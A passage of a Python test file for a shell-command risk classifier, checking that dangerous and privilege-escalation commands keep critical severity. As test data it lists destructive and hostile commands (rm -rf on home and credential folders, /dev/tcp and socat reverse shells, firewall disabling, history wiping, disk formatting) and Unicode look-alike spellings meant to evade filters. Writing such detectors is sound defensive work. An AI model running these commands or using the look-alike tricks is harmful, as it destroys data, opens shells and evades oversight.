def test_safe_path_rejects_non_literal_characters(path):
    # Pins _SAFE_PATH itself. _safe_words() already rejects quotes, $ and
    # backticks, so no command line reaches _safe_target with them (that
    # mutation is unobservable through analyze_command); test the regex directly.
    assert not _priv._SAFE_PATH.fullmatch(path)
    assert not _priv._safe_target(path)


@pytest.mark.parametrize("path", ["x", "a/b.c", "tmp-x/y_z", "/tmp/a+b", "/var/tmp/x/y"])
def test_safe_path_accepts_literal_paths(path):
    assert _priv._SAFE_PATH.fullmatch(path)
    assert _priv._safe_target(path)


@pytest.mark.parametrize("command", [
    'rm -rf "$HOME"', "rm -rf /tmp/$X", "rm -rf /tmp/`x`",
    "rm -rf /tmp/a:b", "rm -rf /tmp/a@b", "rm -rf /tmp/a=b", "rm -rf /tmp/a,b",
    "rm -rf /tmp/a%b", "rm -rf /tmp/a#b", "rm -rf /tmp/a^b",
])
def test_rm_with_non_literal_path_chars_is_not_lowered(command):
    assert _sev(command, DANGEROUS) == CRIT


# --- final review: Unicode literal gates, service verbs, linear cd/rm check ---
# Python's IGNORECASE also matches U+017F (long s) to s, U+212A (Kelvin sign)
# to k, and U+0130/U+0131 (dotted/dotless I) to i. develop flags these; the
# literal gates must not drop them.

_UNICODE = [
    "\u017fudo bash", "\u017fu - root", "vi\u017fudo", "\u017fetenforce 0",
    "hi\u017ftory -c", "p\u212aexec bash", "m\u212afs.ext4 /dev/sda", "/bin/\u017fh -i",
    "ufw di\u017fable", "\u017focat - EXEC:sh", "chmod +\u017f x", "\u017fetcap x",
    "ufw d\u0131sable", "ufw d\u0130sable", "/bin/sh -\u0131",
    "rm -rf ~/\u017f", "\u017fystemctl start x", "iptable\u017f -F",
    "rm .ba\u017fh_history", "python \u017focket connect", "bash -\u0131 >& /dev/tcp/1/2",
    "u\u017feradd x", "\u017fervice x start", "chown \u017fudo",
    "sudo apt update; \u017fudo bash", "\u017fudo -u root -s", "\u017fudo tee /etc/\u017fudoers",
    "echo hi; \u017fudo \u017fh",
]


def test_unicode_case_fold_table_is_complete():
    # every code point re.IGNORECASE matches to an ASCII letter or digit
    cls = re.compile("[a-z0-9]", re.IGNORECASE)
    found = {c for c in range(128, 0x110000) if cls.fullmatch(chr(c))}
    assert found == set(_priv._FOLD)


@pytest.mark.parametrize("command", _UNICODE)
def test_unicode_develop_matches_are_still_matches(command):
    sigs = _sigs(command)
    dev_d = bool(_DEV_DANGEROUS.search(command))
    dev_p = bool(PRIVILEGE_COMMAND_REGEX.search(command))
    assert dev_d or dev_p, "not a develop match: the case proves nothing"
    if dev_d:
        assert DANGEROUS in sigs, "dropped a develop dangerous_command match"
    if dev_p:
        assert PRIVILEGE in sigs, "dropped a develop privilege_escalation match"


@pytest.mark.parametrize("command", [
    "\u017fudo bash", "\u017fu - root", "vi\u017fudo", "sudo apt update; \u017fudo bash",
    "echo hi; \u017fudo \u017fh", "\u017fudo -u root -s",
])
def test_unicode_elevators_stay_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "sudo service ../../../tmp/x start", "sudo service /tmp/evil start",
    "sudo service ./x start", "sudo service x/../../tmp start", "sudo service ../x status",
    "sudo service /tmp/x status", "sudo service ssh stop", "sudo service ufw stop",
    "sudo service apparmor stop", "sudo service foo restart", "sudo service foo reload",
    "sudo service --status-all", "sudo service foo --full-restart",
    "sudo service x status y", "sudo service", "sudo service x",
])
def test_service_paths_and_write_verbs_stay_critical(command):
    assert _sev(command, PRIVILEGE) == CRIT


def test_service_stop_matches_systemctl_stop():
    assert _sev("sudo service ssh stop", PRIVILEGE) == _sev(
        "sudo systemctl stop sshd", PRIVILEGE) == CRIT


@pytest.mark.parametrize("command", [
    "sudo service x status", "sudo service nginx status", "sudo service php8.2-fpm status",
])
def test_service_status_is_high(command):
    assert _sev(command, PRIVILEGE) == HIGH


def _pairwise_cd_credential(command: str) -> bool:
    """The old quadratic check, as the oracle for the linear one."""
    dirs, targets = [], []
    for segment in _priv._segments(command):
        words = _priv._safe_words(segment) or []
        if not words:
            continue
        if _priv._prog(words[0]) in ("cd", "pushd"):
            dirs += words[1:]
        elif _priv._prog(words[0]) == "rm":
            targets += [w for w in words[1:] if not w.startswith("-")]
    return any(_priv._credential(d + "/" + t) for d in dirs for t in targets)


@pytest.mark.parametrize("command", [
    "cd .config && rm -rf ./gcloud", "cd a/.config && rm -rf ./gcloud/x",
    "cd x.config && rm -rf ./gcloudy", "cd .local && rm -rf ./share/keyrings",
    "cd .local/share && rm -rf ./keyrings", "cd Library && rm -rf ./Keychains",
    "cd ./library/ && rm -rf ./keychains", "cd a && cd .config && rm -rf ./b ./gcloud",
    "cd .config && rm -rf ./gcloud-not", "cd .confi && rm -rf ./g/gcloud",
    "cd .config/ && rm -rf ./", "cd / && rm -rf ./x", "cd .ssh && rm -rf ./a",
    "cd a && rm -rf ./.aws", "cd a && rm -rf ./b", "cd .config", "rm -rf ./gcloud",
    "cd .config/g && rm -rf ./cloud", "cd .CONFIG && rm -rf ./GCloud",
    "cd .local/sha && rm -rf ./re/keyrings", "cd .lo && rm -rf ./cal/share/keyrings",
])
def test_linear_cd_credential_check_matches_pairwise(command):
    assert _priv._cd_joins_credential(command) == _pairwise_cd_credential(command)


@pytest.mark.parametrize("command", [
    "cd a&&" * 1650 + "rm -rf " + "./b " * 2500,
    "cd a/.confi&&" * 900 + "rm -rf " + "./b " * 2000,
    "cd a&&" * 1650 + "rm -rf " + "./b " * 2499 + "./gcloud",
])
def test_cd_rm_pairing_is_linear(command):
    assert len(command) < _priv._CAP
    analyze_command.cache_clear()
    t = time.perf_counter()
    analyze_command(command)
    assert time.perf_counter() - t < 0.25
